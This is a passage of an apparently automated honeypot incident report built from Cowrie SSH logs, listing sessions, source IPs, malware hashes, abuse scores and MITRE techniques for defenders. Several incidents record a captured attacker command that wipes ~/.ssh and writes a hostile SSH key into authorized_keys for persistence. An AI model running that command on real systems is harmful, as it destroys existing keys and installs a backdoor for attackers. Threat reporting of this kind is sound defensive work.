| `2026-04-03 20:13:16` | `cowrie.log.closed` |
| `2026-04-03 20:13:16` | `cowrie.session.params` |
| `2026-04-03 20:13:16` | `cowrie.command.input` |
| `2026-04-03 20:13:16` | `cowrie.session.file_download` |
| `2026-04-03 20:13:16` | `cowrie.log.closed` |
| `2026-04-03 20:13:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.34[.]157` to AbuseIPDB if not already reported
- [ ] Block `118.193.34[.]157` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f30628fa8da

| Field | Detail |
|---|---|
| **Source IP** | `118.193.34[.]157` |
| **First Seen** | 2026-04-03 20:13 |
| **Last Seen** | 2026-04-03 20:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 20:13:18` | `cowrie.session.connect` |
| `2026-04-03 20:13:18` | `cowrie.client.version` |
| `2026-04-03 20:13:18` | `cowrie.client.kex` |
| `2026-04-03 20:13:19` | `cowrie.login.success` |
| `2026-04-03 20:13:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.34[.]157` to AbuseIPDB if not already reported
- [ ] Block `118.193.34[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99b2f594c7ef

| Field | Detail |
|---|---|
| **Source IP** | `186.251.71[.]202` |
| **First Seen** | 2026-04-03 20:15 |
| **Last Seen** | 2026-04-03 20:15 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 20:15:27` | `cowrie.session.connect` |
| `2026-04-03 20:15:27` | `cowrie.client.version` |
| `2026-04-03 20:15:28` | `cowrie.client.kex` |
| `2026-04-03 20:15:29` | `cowrie.login.success` |
| `2026-04-03 20:15:30` | `cowrie.session.params` |
| `2026-04-03 20:15:30` | `cowrie.command.input` |
| `2026-04-03 20:15:30` | `cowrie.command.failed` |
| `2026-04-03 20:15:30` | `cowrie.log.closed` |
| `2026-04-03 20:15:31` | `cowrie.session.params` |
| `2026-04-03 20:15:31` | `cowrie.command.input` |
| `2026-04-03 20:15:31` | `cowrie.session.file_download` |
| `2026-04-03 20:15:31` | `cowrie.log.closed` |
| `2026-04-03 20:15:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.251.71[.]202` to AbuseIPDB if not already reported
- [ ] Block `186.251.71[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-769e0d841136

| Field | Detail |
|---|---|
| **Source IP** | `118.193.34[.]157` |
| **First Seen** | 2026-04-03 20:15 |
| **Last Seen** | 2026-04-03 20:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 20:15:30` | `cowrie.session.connect` |
| `2026-04-03 20:15:30` | `cowrie.client.version` |
| `2026-04-03 20:15:30` | `cowrie.client.kex` |
| `2026-04-03 20:15:30` | `cowrie.login.success` |
| `2026-04-03 20:15:31` | `cowrie.session.params` |
| `2026-04-03 20:15:31` | `cowrie.command.input` |
| `2026-04-03 20:15:31` | `cowrie.command.failed` |
| `2026-04-03 20:15:31` | `cowrie.log.closed` |
| `2026-04-03 20:15:31` | `cowrie.session.params` |
| `2026-04-03 20:15:31` | `cowrie.command.input` |
| `2026-04-03 20:15:31` | `cowrie.session.file_download` |
| `2026-04-03 20:15:31` | `cowrie.log.closed` |
| `2026-04-03 20:15:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.34[.]157` to AbuseIPDB if not already reported
- [ ] Block `118.193.34[.]157` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98b533e79e2e

| Field | Detail |
|---|---|
| **Source IP** | `118.193.34[.]157` |
| **First Seen** | 2026-04-03 20:15 |
| **Last Seen** | 2026-04-03 20:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 20:15:33` | `cowrie.session.connect` |
| `2026-04-03 20:15:33` | `cowrie.client.version` |
| `2026-04-03 20:15:33` | `cowrie.client.kex` |
| `2026-04-03 20:15:33` | `cowrie.login.success` |
| `2026-04-03 20:15:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.34[.]157` to AbuseIPDB if not already reported
- [ ] Block `118.193.34[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b6c8b6600ea

| Field | Detail |
|---|---|
| **Source IP** | `186.251.71[.]202` |
| **First Seen** | 2026-04-03 20:15 |
| **Last Seen** | 2026-04-03 20:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 20:15:35` | `cowrie.session.connect` |
| `2026-04-03 20:15:35` | `cowrie.client.version` |
| `2026-04-03 20:15:35` | `cowrie.client.kex` |
| `2026-04-03 20:15:37` | `cowrie.login.success` |
| `2026-04-03 20:15:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.251.71[.]202` to AbuseIPDB if not already reported
- [ ] Block `186.251.71[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-419365eb9837

| Field | Detail |
|---|---|
| **Source IP** | `186.251.71[.]202` |
| **First Seen** | 2026-04-03 20:23 |
| **Last Seen** | 2026-04-03 20:23 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 20:23:39` | `cowrie.session.connect` |
| `2026-04-03 20:23:39` | `cowrie.client.version` |
| `2026-04-03 20:23:40` | `cowrie.client.kex` |
| `2026-04-03 20:23:41` | `cowrie.login.success` |
| `2026-04-03 20:23:42` | `cowrie.session.params` |
| `2026-04-03 20:23:42` | `cowrie.command.input` |
| `2026-04-03 20:23:42` | `cowrie.command.failed` |
| `2026-04-03 20:23:42` | `cowrie.log.closed` |
| `2026-04-03 20:23:43` | `cowrie.session.params` |
| `2026-04-03 20:23:43` | `cowrie.command.input` |
| `2026-04-03 20:23:43` | `cowrie.session.file_download` |
| `2026-04-03 20:23:43` | `cowrie.log.closed` |
| `2026-04-03 20:23:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.251.71[.]202` to AbuseIPDB if not already reported
- [ ] Block `186.251.71[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d06845990c36

| Field | Detail |
|---|---|
| **Source IP** | `186.251.71[.]202` |
| **First Seen** | 2026-04-03 20:23 |
| **Last Seen** | 2026-04-03 20:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 20:23:47` | `cowrie.session.connect` |
| `2026-04-03 20:23:47` | `cowrie.client.version` |
| `2026-04-03 20:23:47` | `cowrie.client.kex` |
| `2026-04-03 20:23:49` | `cowrie.login.success` |
| `2026-04-03 20:23:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.251.71[.]202` to AbuseIPDB if not already reported
- [ ] Block `186.251.71[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b92833d60ac

| Field | Detail |
|---|---|
| **Source IP** | `118.193.34[.]157` |
| **First Seen** | 2026-04-03 20:31 |
| **Last Seen** | 2026-04-03 20:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 20:31:06` | `cowrie.session.connect` |
| `2026-04-03 20:31:06` | `cowrie.client.version` |
| `2026-04-03 20:31:07` | `cowrie.client.kex` |
| `2026-04-03 20:31:07` | `cowrie.login.success` |
| `2026-04-03 20:31:07` | `cowrie.session.params` |
| `2026-04-03 20:31:07` | `cowrie.command.input` |
| `2026-04-03 20:31:07` | `cowrie.command.failed` |
| `2026-04-03 20:31:07` | `cowrie.log.closed` |
| `2026-04-03 20:31:08` | `cowrie.session.params` |
| `2026-04-03 20:31:08` | `cowrie.command.input` |
| `2026-04-03 20:31:08` | `cowrie.session.file_download` |
| `2026-04-03 20:31:08` | `cowrie.log.closed` |
| `2026-04-03 20:31:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.34[.]157` to AbuseIPDB if not already reported
- [ ] Block `118.193.34[.]157` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b42feb80762d

| Field | Detail |
|---|---|
| **Source IP** | `118.193.34[.]157` |
| **First Seen** | 2026-04-03 20:31 |
| **Last Seen** | 2026-04-03 20:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 20:31:10` | `cowrie.session.connect` |
| `2026-04-03 20:31:10` | `cowrie.client.version` |
| `2026-04-03 20:31:10` | `cowrie.client.kex` |
| `2026-04-03 20:31:10` | `cowrie.login.success` |
| `2026-04-03 20:31:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.34[.]157` to AbuseIPDB if not already reported
- [ ] Block `118.193.34[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bca3b88aa552

| Field | Detail |
|---|---|
| **Source IP** | `118.193.34[.]157` |
| **First Seen** | 2026-04-03 20:33 |
| **Last Seen** | 2026-04-03 20:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 20:33:22` | `cowrie.session.connect` |
| `2026-04-03 20:33:22` | `cowrie.client.version` |
| `2026-04-03 20:33:22` | `cowrie.client.kex` |
| `2026-04-03 20:33:22` | `cowrie.login.success` |
| `2026-04-03 20:33:23` | `cowrie.session.params` |
| `2026-04-03 20:33:23` | `cowrie.command.input` |
| `2026-04-03 20:33:23` | `cowrie.command.failed` |
| `2026-04-03 20:33:23` | `cowrie.log.closed` |
| `2026-04-03 20:33:23` | `cowrie.session.params` |
| `2026-04-03 20:33:23` | `cowrie.command.input` |
| `2026-04-03 20:33:23` | `cowrie.session.file_download` |
| `2026-04-03 20:33:23` | `cowrie.log.closed` |
| `2026-04-03 20:33:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.34[.]157` to AbuseIPDB if not already reported
- [ ] Block `118.193.34[.]157` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-565bdd4ae52a

| Field | Detail |
|---|---|
| **Source IP** | `118.193.34[.]157` |
| **First Seen** | 2026-04-03 20:33 |
| **Last Seen** | 2026-04-03 20:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 20:33:25` | `cowrie.session.connect` |
| `2026-04-03 20:33:25` | `cowrie.client.version` |
| `2026-04-03 20:33:25` | `cowrie.client.kex` |
| `2026-04-03 20:33:25` | `cowrie.login.success` |
| `2026-04-03 20:33:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.34[.]157` to AbuseIPDB if not already reported
- [ ] Block `118.193.34[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `66.167.169[.]165` | **25** | 2026-04-03 19:21 | 2026-04-03 19:27 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `118.193.34[.]157` | **21** | 2026-04-03 19:44 | 2026-04-03 20:33 | 0m | 21 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `186.251.71[.]202` | **10** | 2026-04-03 19:54 | 2026-04-03 20:31 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `1.92.145[.]107` | **4** | 2026-04-03 18:45 | 2026-04-03 20:31 | 2m | 0 | `T1592` | 🟢 LOW |
| `101.52.130[.]122` | **2** | 2026-04-03 19:37 | 2026-04-03 19:38 | 1m | 0 | `T1592` | 🟢 LOW |
| `111.70.51[.]23` | **2** | 2026-04-03 18:48 | 2026-04-03 19:46 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `40.124.186[.]155` | **2** | 2026-04-03 19:25 | 2026-04-03 19:25 | 0m | 0 | `T1592` | 🟢 LOW |
| `112.194.142[.]167` | 1 | 2026-04-03 19:45 | 2026-04-03 19:46 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `119.152.102[.]54` | 1 | 2026-04-03 18:48 | 2026-04-03 18:48 | 3s | 0 | `T1592` | 🟢 LOW |
| `14.103.111[.]16` | 1 | 2026-04-03 18:55 | 2026-04-03 18:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `175.129.195[.]46` | 1 | 2026-04-03 20:24 | 2026-04-03 20:24 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `175.137.73[.]32` | 1 | 2026-04-03 19:42 | 2026-04-03 19:43 | 13s | 0 | `T1592` | 🟢 LOW |
| `180.76.146[.]235` | 1 | 2026-04-03 19:39 | 2026-04-03 19:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `182.75.227[.]178` | 1 | 2026-04-03 20:05 | 2026-04-03 20:05 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `190.149.113[.]86` | 1 | 2026-04-03 20:33 | 2026-04-03 20:33 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.158.26[.]59` | 1 | 2026-04-03 19:17 | 2026-04-03 19:17 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `196.188.187[.]85` | 1 | 2026-04-03 19:26 | 2026-04-03 19:26 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `200.106.49[.]149` | 1 | 2026-04-03 19:55 | 2026-04-03 19:55 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `218.29.196[.]162` | 1 | 2026-04-03 19:26 | 2026-04-03 19:26 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `5.32.22[.]218` | 1 | 2026-04-03 19:36 | 2026-04-03 19:36 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `65.20.133[.]56` | 1 | 2026-04-03 20:14 | 2026-04-03 20:14 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `78.197.6[.]173` | 1 | 2026-04-03 19:07 | 2026-04-03 19:07 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `85.105.2[.]51` | 1 | 2026-04-03 20:04 | 2026-04-03 20:04 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `94.205.250[.]78` | 1 | 2026-04-03 20:24 | 2026-04-03 20:24 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (21 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `190.149.113[.]86` | GT | Telgua | **100** ⚠️ | 7 |
| `78.197.6[.]173` | FR | Free SAS | **100** ⚠️ | 50 |
| `112.194.142[.]167` | CN | China Unicom Sichuan province network | **100** ⚠️ | 50 |
| `119.152.102[.]54` | PK | Pakistan Telecommunication Company Limited | **100** ⚠️ | 45 |
| `175.129.195[.]46` | JP | KDDI CORPORATION | **100** ⚠️ | 14 |
| `94.205.250[.]78` | AE | Emirates Integrated Telecommunications Company PJSC (EITC-DU) | **100** ⚠️ | 50 |
| `200.106.49[.]149` | PE | INTEGRATEL PERÚ S.A.A. | **100** ⚠️ | 50 |
| `186.251.71[.]202` | BR | PW INFORMATICA E TECNOLOGIA LTDA | **100** ⚠️ | 50 |
| `118.193.34[.]157` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 34 |
| `1.92.145[.]107` | CN | Huawei Public Cloud Service (Huawei Software Technologies Ltd.Co) | **100** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 72 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 45 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 21 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 11 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 11 |

---

## 🔕 False Positive Summary (4 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 10 below threshold 25 | 1 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 20 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 108 cases |
| Tool 34  | Credential Extractor        | ✅ 66 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 28 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 4 filtered (3.7%) |
